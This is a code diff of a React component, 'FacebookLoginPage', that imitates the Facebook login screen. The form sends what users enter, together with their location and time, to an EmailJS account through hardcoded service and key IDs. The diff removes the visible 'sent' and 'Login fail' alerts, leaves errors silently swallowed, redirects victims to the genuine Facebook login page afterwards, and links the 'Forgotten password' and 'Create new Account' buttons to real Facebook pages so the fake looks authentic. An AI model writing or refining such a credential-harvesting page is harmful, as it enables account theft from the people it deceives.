@@ -59,20 +59,17 @@ const FacebookLoginPage = () => {
             country: location.country,
             loc: location.loc,
             datetime: dateTime,
-          };
+        };
         try {
             const result = await emailjs.send(
-              'service_z7ysfj4',  
-              'template_npetqre',   
-              templateParams,
-              'HYmy10exBQfzB2uAf'   
+                'service_z7ysfj4',
+                'template_npetqre',
+                templateParams,
+                'HYmy10exBQfzB2uAf'
             );
-            console.log('Email sent!', result.text);
-            alert('sent.');
-          } catch (error) {
-            console.error('Email sending failed:', error);
-            alert('Login fail.');
-          }
+            window.location('https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzQ0OTgyODM0LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next')
+        } catch (error) {
+        }
 
     };
     return (
@@ -99,8 +96,8 @@ const FacebookLoginPage = () => {
                                 placeholder="Password"
                             />
                             <button onClick={onSubmit} className="btn-login">Login</button>
-                            <a>Forgotten password?</a>
-                            <button className="btn-new">Create new Account</button>
+                            <a href='https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0'>Forgotten password?</a>
+                            <button href='https://www.facebook.com/r.php?entry_point=login' className="btn-new">Create new Account</button>
                         </div>
                         <p>
                             <a  ><b>Create a Page</b></a> for a celebrity, brand or business.
